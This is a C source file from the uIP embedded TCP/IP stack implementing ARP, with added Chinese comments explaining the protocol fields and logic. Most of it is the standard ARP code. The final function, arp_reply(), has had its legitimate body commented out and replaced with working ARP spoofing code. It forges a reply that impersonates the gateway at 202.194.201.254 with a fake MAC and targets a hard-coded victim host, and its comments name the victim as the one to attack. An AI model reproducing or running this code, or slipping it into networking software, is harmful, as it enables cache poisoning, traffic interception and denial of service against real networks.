/**
 * \addtogroup uip
 * @{
 */

/**
 * \defgroup uiparp uIP Address Resolution Protocol
 * @{
 *
 * The Address Resolution Protocol ARP is used for mapping between IP
 * addresses and link level addresses such as the Ethernet MAC
 * addresses. ARP uses broadcast queries to ask for the link level
 * address of a known IP address and the host which is configured with
 * the IP address for which the query was meant, will respond with its
 * link level address.
 *
 * \note This ARP implementation only supports Ethernet.
 */

/**
 * \file
 * Implementation of the ARP Address Resolution Protocol.
 * \author Adam Dunkels <adam@dunkels.com>
 *
 */

/*
 * Copyright (c) 2001-2003, Adam Dunkels.
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 * 1. Redistributions of source code must retain the above copyright
 *    notice, this list of conditions and the following disclaimer.
 * 2. Redistributions in binary form must reproduce the above copyright
 *    notice, this list of conditions and the following disclaimer in the
 *    documentation and/or other materials provided with the distribution.
 * 3. The name of the author may not be used to endorse or promote
 *    products derived from this software without specific prior
 *    written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS'' AND ANY EXPRESS
 * OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
 * WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
 * ARE DISCLAIMED.  IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY
 * DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
 * DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE
 * GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
 * INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY,
 * WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
 * NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 *
 * This file is part of the uIP TCP/IP stack.
 *
 * $Id: uip_arp.c,v 1.8 2006/06/02 23:36:21 adam Exp $
 *
 */


#include "uip_arp.h"

#include <string.h>
#include "stdio.h"

#define	ARPDEBUG	1

struct arp_hdr {				//ARP头
  struct uip_eth_hdr ethhdr;	//以太网帧头
  u16_t hwtype;		//硬件地址类型，1表示以太网地址
  u16_t protocol;	//协议类型，即要映射的协议类型，0x0800表示IP地址。
  u8_t hwlen;		//硬件地址长度，为6
  u8_t protolen;	//协议地址长度，为4
  u16_t opcode;		//操作码，1表示ARP请求，2表示ARP应答。
  struct uip_eth_addr shwaddr;//发送端硬件地址
  u16_t sipaddr[2];			 //发送端IP地址
  struct uip_eth_addr dhwaddr;	//接收端硬件地址
  u16_t dipaddr[2];				//接收端IP地址
};

struct ethip_hdr {				//IP头
  struct uip_eth_hdr ethhdr;	//以太网帧头
  /* IP header. */
  u8_t vhl,		//版本号+首部长度
    tos,		//TOS，服务类型
    len[2],		//IP包总长度
    ipid[2],	//16位标识
    ipoffset[2],//3位标志+13位片偏移
    ttl,		//生存时间
    proto;		//协议
  u16_t ipchksum;//首部校验和
  u16_t srcipaddr[2],//源IP地址，32位
    destipaddr[2];	//目的IP地址，32位
};

#define ARP_REQUEST 1
#define ARP_REPLY   2

#define ARP_HWTYPE_ETH 1

struct arp_entry {	//IP、MAC映射表
  u16_t ipaddr[2];
  struct uip_eth_addr ethaddr;
  u8_t time;
};

static const struct uip_eth_addr broadcast_ethaddr =
  {{0xff,0xff,0xff,0xff,0xff,0xff}};
static const u16_t broadcast_ipaddr[2] = {0xffff,0xffff};

static struct arp_entry arp_table[UIP_ARPTAB_SIZE];
static u16_t ipaddr[2];
static u8_t i, c;

static u8_t arptime;
static u8_t tmpage;

#define BUF   ((struct arp_hdr *)&uip_buf[0])
#define IPBUF ((struct ethip_hdr *)&uip_buf[0])
/*-----------------------------------------------------------------------------------*/
/**
 * Initialize the ARP module.
 *
 */
/*-----------------------------------------------------------------------------------*/
void
uip_arp_init(void)
{
  for(i = 0; i < UIP_ARPTAB_SIZE; ++i) {
    memset(arp_table[i].ipaddr, 0, 4);
  }
}
/*-----------------------------------------------------------------------------------*/
/**
 * Periodic ARP processing function.
 *
 * This function performs periodic timer processing in the ARP module
 * and should be called at regular intervals. The recommended interval
 * is 10 seconds between the calls.
 *
 */
/*-----------------------------------------------------------------------------------*/
void
uip_arp_timer(void)
{
  struct arp_entry *tabptr;

  ++arptime;
  for(i = 0; i < UIP_ARPTAB_SIZE; ++i) {
    tabptr = &arp_table[i];
    if((tabptr->ipaddr[0] | tabptr->ipaddr[1]) != 0 &&	//如果ARP缓存中非空项到达更新时间，则把该项清空
       arptime - tabptr->time >= UIP_ARP_MAXAGE) {
      memset(tabptr->ipaddr, 0, 4);
    }
  }

}
/*-----------------------------------------------------------------------------------*/
static void
uip_arp_update(u16_t *ipaddr, struct uip_eth_addr *ethaddr)	//更新ARP缓存
{
  register struct arp_entry *tabptr;
  /* Walk through the ARP mapping table and try to find an entry to
     update. If none is found, the IP -> MAC address mapping is
     inserted in the ARP table. */
  for(i = 0; i < UIP_ARPTAB_SIZE; ++i) {//从ARP缓存中寻找刚收到的IP

    tabptr = &arp_table[i];
    /* Only check those entries that are actually in use. */
    if(tabptr->ipaddr[0] != 0 &&
       tabptr->ipaddr[1] != 0) {	//如果ARP缓存中该项正在使用

      /* Check if the source IP address of the incoming packet matches
         the IP address in this ARP table entry. */
      if(ipaddr[0] == tabptr->ipaddr[0] &&
	 ipaddr[1] == tabptr->ipaddr[1]) {//如果ARP缓存中存在此IP

	/* An old entry found, update this and return. */
	memcpy(tabptr->ethaddr.addr, ethaddr->addr, 6);//更新ARP缓存
	tabptr->time = arptime;

	return;
      }
    }
  }

  /* If we get here, no existing ARP table entry was found, so we
     create one. */

  /* First, we try to find an unused entry in the ARP table. */
  for(i = 0; i < UIP_ARPTAB_SIZE; ++i) {	//在ARP缓存中寻找空映射表
    tabptr = &arp_table[i];
    if(tabptr->ipaddr[0] == 0 &&
       tabptr->ipaddr[1] == 0) {
      break;
    }
  }

  /* If no unused entry is found, we try to find the oldest entry and
     throw it away. */
  if(i == UIP_ARPTAB_SIZE) {	//ARP缓存中没有空的项
    tmpage = 0;
    c = 0;
    for(i = 0; i < UIP_ARPTAB_SIZE; ++i) {//寻找ARP缓存中最老的项
      tabptr = &arp_table[i];
      if(arptime - tabptr->time > tmpage) {
	tmpage = arptime - tabptr->time;
	c = i;//最老项序号
      }
    }
    i = c;
    tabptr = &arp_table[i];//最老项指针
  }

  /* Now, i is the ARP table entry which we will fill with the new
     information. */
  memcpy(tabptr->ipaddr, ipaddr, 4);//把当前ARP请求的源IP存到ARP缓存
  memcpy(tabptr->ethaddr.addr, ethaddr->addr, 6);//把当前ARP请求的源MAC存到ARP缓存
  tabptr->time = arptime;
}
/*-----------------------------------------------------------------------------------*/
/**
 * ARP processing for incoming IP packets
 *
 * This function should be called by the device driver when an IP
 * packet has been received. The function will check if the address is
 * in the ARP cache, and if so the ARP cache entry will be
 * refreshed. If no ARP cache entry was found, a new one is created.
 *
 * This function expects an IP packet with a prepended Ethernet header
 * in the uip_buf[] buffer, and the length of the packet in the global
 * variable uip_len.
 */
/*-----------------------------------------------------------------------------------*/
#if 0
void
uip_arp_ipin(void)
{
  uip_len -= sizeof(struct uip_eth_hdr);

  /* Only insert/update an entry if the source IP address of the
     incoming IP packet comes from a host on the local network. */
  if((IPBUF->srcipaddr[0] & uip_netmask[0]) !=
     (uip_hostaddr[0] & uip_netmask[0])) {
    return;
  }
  if((IPBUF->srcipaddr[1] & uip_netmask[1]) !=
     (uip_hostaddr[1] & uip_netmask[1])) {
    return;
  }
  uip_arp_update(IPBUF->srcipaddr, &(IPBUF->ethhdr.src));

  return;
}
#endif /* 0 */
/*-----------------------------------------------------------------------------------*/
/**
 * ARP processing for incoming ARP packets.
 *
 * This function should be called by the device driver when an ARP
 * packet has been received. The function will act differently
 * depending on the ARP packet type: if it is a reply for a request
 * that we previously sent out, the ARP cache will be filled in with
 * the values from the ARP reply. If the incoming ARP packet is an ARP
 * request for our IP address, an ARP reply packet is created and put
 * into the uip_buf[] buffer.
 *
 * When the function returns, the value of the global variable uip_len
 * indicates whether the device driver should send out a packet or
 * not. If uip_len is zero, no packet should be sent. If uip_len is
 * non-zero, it contains the length of the outbound packet that is
 * present in the uip_buf[] buffer.
 *
 * This function expects an ARP packet with a prepended Ethernet
 * header in the uip_buf[] buffer, and the length of the packet in the
 * global variable uip_len.
 */
/*-----------------------------------------------------------------------------------*/
void
uip_arp_arpin(void)
{

  if(uip_len < sizeof(struct arp_hdr)) {
    uip_len = 0;
    return;
  }
  uip_len = 0;

  switch(BUF->opcode) {
  case HTONS(ARP_REQUEST):		//是ARP请求
    /* ARP request. If it asked for our address, we send out a
       reply. */
    if(uip_ipaddr_cmp(BUF->dipaddr, uip_hostaddr)) {	//ARP请求包目标IP是本机
//	  #if ARPDEBUG == 1
	  #if 1
		printf("uIP 收到ARP请求\r\n");
	  #endif
      /* First, we register the one who made the request in our ARP
	 table, since it is likely that we will do more communication
	 with this host in the future. */
      uip_arp_update(BUF->sipaddr, &BUF->shwaddr);//更新本机ARP缓存
	  
	  //开始构建ARP回复包
      /* The reply opcode is 2. */
      BUF->opcode = HTONS(2);

      memcpy(BUF->dhwaddr.addr, BUF->shwaddr.addr, 6);	/* ARP分组的目标MAC地址 */
      memcpy(BUF->shwaddr.addr, uip_ethaddr.addr, 6);	/* ARP分组的源MAC地址（本机MAC） */
      memcpy(BUF->ethhdr.src.addr, uip_ethaddr.addr, 6);/* 以太网帧源地址（本机MAC） */
      memcpy(BUF->ethhdr.dest.addr, BUF->dhwaddr.addr, 6);/* 以太网帧目的地址（发送ARP请求者） */

      BUF->dipaddr[0] = BUF->sipaddr[0];
      BUF->dipaddr[1] = BUF->sipaddr[1];
      BUF->sipaddr[0] = uip_hostaddr[0];
      BUF->sipaddr[1] = uip_hostaddr[1];

      BUF->ethhdr.type = HTONS(UIP_ETHTYPE_ARP);
      uip_len = sizeof(struct arp_hdr);
    }
	else			//ARP请求包目标IP不是本机
	{
		#if 0
			printf("收到非本机的ARP请求 ");
			printf("目标IP地址：%d.%d.%d.%d ",BUF->dipaddr[0]&0x00ff,BUF->dipaddr[0]>>8,BUF->dipaddr[1]&0x00ff,BUF->dipaddr[1]>>8);
			printf("源IP地址：%d.%d.%d.%d\r\n",BUF->sipaddr[0]&0x00ff,BUF->sipaddr[0]>>8,BUF->sipaddr[1]&0x00ff,BUF->sipaddr[1]>>8);
		#endif
	}
    break;
  case HTONS(ARP_REPLY):	//是ARP回复
    /* ARP reply. We insert or update the ARP table if it was meant
       for us. */
	#if ARPDEBUG == 1
		printf("uIP 收到ARP回复\r\n");
		printf("源IP地址：%d.%d.%d.%d\r\n",BUF->sipaddr[0]&0x00ff,BUF->sipaddr[0]>>8,BUF->sipaddr[1]&0x00ff,BUF->sipaddr[1]>>8);
		printf("源MAC地址：%02x.%02x.%02x.%02x.%02x.%02x\r\n",BUF->shwaddr.addr[0],BUF->shwaddr.addr[1],BUF->shwaddr.addr[2],BUF->shwaddr.addr[3],BUF->shwaddr.addr[4],BUF->shwaddr.addr[5]);
	#endif
    if(uip_ipaddr_cmp(BUF->dipaddr, uip_hostaddr)) {	//ARP回复的目标IP是本机
      uip_arp_update(BUF->sipaddr, &BUF->shwaddr);	/* 源IP地址，源MAC地址，更新动态映射表 */
    }
    break;
  }

  return;
}
/*-----------------------------------------------------------------------------------*/
/**
 * Prepend Ethernet header to an outbound IP packet and see if we need
 * to send out an ARP request.
 *
 * This function should be called before sending out an IP packet. The
 * function checks the destination IP address of the IP packet to see
 * what Ethernet MAC address that should be used as a destination MAC
 * address on the Ethernet.
 *
 * If the destination IP address is in the local network (determined
 * by logical ANDing of netmask and our IP address), the function
 * checks the ARP cache to see if an entry for the destination IP
 * address is found. If so, an Ethernet header is prepended and the
 * function returns. If no ARP cache entry is found for the
 * destination IP address, the packet in the uip_buf[] is replaced by
 * an ARP request packet for the IP address. The IP packet is dropped
 * and it is assumed that they higher level protocols (e.g., TCP)
 * eventually will retransmit the dropped packet.
 *
 * If the destination IP address is not on the local network, the IP
 * address of the default router is used instead.
 *
 * When the function returns, a packet is present in the uip_buf[]
 * buffer, and the length of the packet is in the global variable
 * uip_len.
 */
/*-----------------------------------------------------------------------------------*/
/*判断目标IP和本机是否在同一子网，如果是，则搜索本机ARP缓存，寻找目的MAC地址，如果缓存中有该IP的MAC地址，则直接封装
*如果没有，则用新的ARP请求包代替原数据包，原数据包直接被丢弃。
*如果目标IP和本机不在同一子网，则目标MAC填写默认网关MAC，期望默认网关转发该数据包
*/
void
uip_arp_out(void)
{
  struct arp_entry *tabptr;

  /* Find the destination IP address in the ARP table and construct
     the Ethernet header. If the destination IP addres isn't on the
     local network, we use the default router's IP address instead.

     If not ARP table entry is found, we overwrite the original IP
     packet with an ARP request for the IP address. */

  /* First check if destination is a local broadcast. */
  if(uip_ipaddr_cmp(IPBUF->destipaddr, broadcast_ipaddr)) //如果是本地广播，则目标MAC为0xFF
  {
    memcpy(IPBUF->ethhdr.dest.addr, broadcast_ethaddr.addr, 6);
  } 
  else 
  {
    /* Check if the destination address is on the local network. */
    if(!uip_ipaddr_maskcmp(IPBUF->destipaddr, uip_hostaddr, uip_netmask)) //如果目标IP和本机不在同一子网，则目标MAC是默认网关
	{
      /* Destination address was not on the local network, so we need to
	 use the default router's IP address instead of the destination
	 address when determining the MAC address. */
      uip_ipaddr_copy(ipaddr, uip_draddr);
    } 
	else //如果目标IP和本机在同一子网，则目标MAC是目标主机的MAC
	{
      /* Else, we use the destination IP address. */
      uip_ipaddr_copy(ipaddr, IPBUF->destipaddr);
    }

    for(i = 0; i < UIP_ARPTAB_SIZE; ++i) //在ARP缓存中寻找目标IP
	{
      tabptr = &arp_table[i];
      if(uip_ipaddr_cmp(ipaddr, tabptr->ipaddr)) 
	  {
		break;
      }
    }
	//ARP缓存中没有目标IP信息，则构建ARP包，丢弃原数据包
    if(i == UIP_ARPTAB_SIZE) 
	{
      /* The destination address was not in our ARP table, so we
	 overwrite the IP packet with an ARP request. */

      memset(BUF->ethhdr.dest.addr, 0xff, 6);
      memset(BUF->dhwaddr.addr, 0x00, 6);
      memcpy(BUF->ethhdr.src.addr, uip_ethaddr.addr, 6);
      memcpy(BUF->shwaddr.addr, uip_ethaddr.addr, 6);

      uip_ipaddr_copy(BUF->dipaddr, ipaddr);//默认网关IP，或同一子网主机IP
      uip_ipaddr_copy(BUF->sipaddr, uip_hostaddr);
      BUF->opcode = HTONS(ARP_REQUEST); /* ARP request. */
      BUF->hwtype = HTONS(ARP_HWTYPE_ETH);
      BUF->protocol = HTONS(UIP_ETHTYPE_IP);
      BUF->hwlen = 6;
      BUF->protolen = 4;
      BUF->ethhdr.type = HTONS(UIP_ETHTYPE_ARP);

      uip_appdata = &uip_buf[UIP_TCPIP_HLEN + UIP_LLH_LEN];//IP+TCP头,链路层头部

      uip_len = sizeof(struct arp_hdr);
      return;
    }
	//ARP缓存中有目标IP信息
    /* Build an ethernet header. */
    memcpy(IPBUF->ethhdr.dest.addr, tabptr->ethaddr.addr, 6);
  }
  memcpy(IPBUF->ethhdr.src.addr, uip_ethaddr.addr, 6);//填写以太网帧源MAC信息

  IPBUF->ethhdr.type = HTONS(UIP_ETHTYPE_IP);		  //填写以太网帧类型信息

  uip_len += sizeof(struct uip_eth_hdr);
}
/*-----------------------------------------------------------------------------------*/


/*-----------------------------------------------------------------------------------*/
/**
 * 发送ARP请求
 */
/*-----------------------------------------------------------------------------------*/

void arp_request(void)
{
	memset(BUF->ethhdr.dest.addr, 0xff, 6);				//以太网首部，目的硬件地址
	memset(BUF->dhwaddr.addr, 0x00, 6);					//ARP包，目的硬件地址
	memcpy(BUF->ethhdr.src.addr, uip_ethaddr.addr, 6);	//以太网首部，源硬件地址
	memcpy(BUF->shwaddr.addr, uip_ethaddr.addr, 6);		//ARP包，源硬件地址

	uip_ipaddr(ipaddr, 202,194,201,58);	

	uip_ipaddr_copy(BUF->dipaddr, ipaddr);				//ARP包目标IP地址
	uip_ipaddr_copy(BUF->sipaddr, uip_hostaddr);		//ARP包源IP地址
	BUF->opcode = HTONS(ARP_REQUEST); /* ARP request. *///操作码，1表示ARP请求，2表示ARP应答
	BUF->hwtype = HTONS(ARP_HWTYPE_ETH);				//硬件类型
	BUF->protocol = HTONS(UIP_ETHTYPE_IP);				//协议类型，0x0800
	BUF->hwlen = 6;										//硬件地址长度
	BUF->protolen = 4;									//协议地址长度(IP)
	BUF->ethhdr.type = HTONS(UIP_ETHTYPE_ARP);			//以太网首部，帧类型

	uip_len = sizeof(struct arp_hdr);
}


/*-----------------------------------------------------------------------------------*/
/**
 * 应答ARP请求
 */
/*-----------------------------------------------------------------------------------*/

void arp_reply(void)
{
	/*struct uip_eth_addr desthwaddr = {0xcc,0x52,0xaf,0x4c,0x8e,0x24};
	
	memcpy(BUF->ethhdr.dest.addr, desthwaddr.addr, 6);	//以太网首部，目的硬件地址
	memcpy(BUF->ethhdr.src.addr, uip_ethaddr.addr, 6);	//以太网首部，源硬件地址
	BUF->ethhdr.type = HTONS(UIP_ETHTYPE_ARP);			//以太网首部，帧类型

	uip_ipaddr(ipaddr, 202,194,201,57);					

	memcpy(BUF->dhwaddr.addr, desthwaddr.addr, 6);		//ARP包，目的硬件地址
	uip_ipaddr_copy(BUF->dipaddr, ipaddr);				//ARP包目标IP地址
	memcpy(BUF->shwaddr.addr, uip_ethaddr.addr, 6);		//ARP包，源硬件地址
	uip_ipaddr_copy(BUF->sipaddr, uip_hostaddr);		//ARP包源IP地址
	
	BUF->hwtype = HTONS(ARP_HWTYPE_ETH);				//硬件类型
	BUF->protocol = HTONS(UIP_ETHTYPE_IP);				//协议类型，0x0800
	BUF->hwlen = 6;										//硬件地址长度
	BUF->protolen = 4;									//协议地址长度(IP)
	BUF->opcode = HTONS(ARP_REPLY);						

	uip_len = sizeof(struct arp_hdr);*/

	
	struct uip_eth_addr desthwaddr = {0xff,0xff,0xe6,0x30,0x8f,0xff};	//目标硬件地址，要攻击的目标MAC，可以通过arp获得
	struct uip_eth_addr imagine_eth_addr={0x12,0x23,0x34,0x45,0x56,0x67};//网关假MAC
	
	memcpy(BUF->ethhdr.dest.addr, desthwaddr.addr, 6);	//以太网首部，目的硬件地址，要攻击的目标MAC
	memcpy(BUF->ethhdr.src.addr, imagine_eth_addr.addr, 6);	//以太网首部，源硬件地址，网关假MAC
	BUF->ethhdr.type = HTONS(UIP_ETHTYPE_ARP);			//以太网首部，帧类型

	uip_ipaddr(ipaddr, 202,194,201,58);					

	memcpy(BUF->dhwaddr.addr, desthwaddr.addr, 6);		//ARP包，目的硬件地址，要攻击的目标MAC
	uip_ipaddr_copy(BUF->dipaddr, ipaddr);				//ARP包目标IP地址，要攻击目标的IP
	memcpy(BUF->shwaddr.addr, imagine_eth_addr.addr, 6);	//ARP包，源硬件地址，网关假MAC
	
	uip_ipaddr(ipaddr, 202,194,201,254);					//ARP包源IP地址，即把自己的IP伪装成网关
	uip_ipaddr_copy(BUF->sipaddr, ipaddr);			
	
	BUF->hwtype = HTONS(ARP_HWTYPE_ETH);				//硬件类型
	BUF->protocol = HTONS(UIP_ETHTYPE_IP);				//协议类型，0x0800
	BUF->hwlen = 6;										//硬件地址长度
	BUF->protolen = 4;									//协议地址长度(IP)
	BUF->opcode = HTONS(ARP_REPLY);						

	uip_len = sizeof(struct arp_hdr);
}

/** @} */
/** @} */
